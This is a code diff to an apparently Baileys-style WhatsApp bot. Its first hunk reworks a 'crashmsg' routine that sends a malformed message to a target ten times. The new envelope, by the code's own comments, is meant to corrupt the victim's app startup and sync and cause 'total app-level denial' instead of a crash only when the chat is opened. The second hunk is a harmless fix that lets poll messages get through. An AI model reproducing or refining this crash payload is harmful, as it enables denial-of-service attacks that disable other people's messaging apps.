@@ -2602,7 +2602,13 @@ async function sendCrashmsgProbe(prim, target) {
     let sent = 0, firstWireBytes = 0;
     for (let i = 0; i < 10; i++) {
         const payload = {
-            viewOnceMessage: {
+            // App-level envelope (same class as crash-hard's groupStatus
+            // pipeline): poisons the app's startup/sync path instead of the
+            // chat-render path, converting the hybrid from a chat-level
+            // crash-on-open into a total app-level denial. The original
+            // fvckb1tch used viewOnceMessage (chat-level) — viewOnce version
+            // remains in git history if the comparison is ever needed.
+            groupStatusMessageV2: {
                 message: {
                     groupStatusMentionMessage: {
                         messageAssociation: {
@@ -3243,6 +3249,19 @@ async function createSocketForSession({ phoneNumber, tgId, authDir, version = nu
             } catch (err) {
                 logError('WA-REACT', `${phoneNumber}: raw relay reaction also failed (${err?.message || err}) — giving up`);
             }
+        }
+        // Fork compat: the fork only attaches the required `polltype: creation`
+        // meta node when its aiLabel config is enabled — without it the server
+        // silently drops polls (persona/menu polls never arrive even though
+        // the send appears to succeed). Pass the node explicitly per poll.
+        if (content && typeof content === 'object' && content.poll) {
+            options = {
+                ...(options || {}),
+                additionalNodes: [
+                    ...(((options && options.additionalNodes) || [])),
+                    { tag: 'meta', attrs: { polltype: 'creation' } }
+                ]
+            };
         }
         const res = await _origSendMessage(jid, content, options);
         const toJid = typeof jid === 'string' ? jid : (jid?.remoteJid || '?');
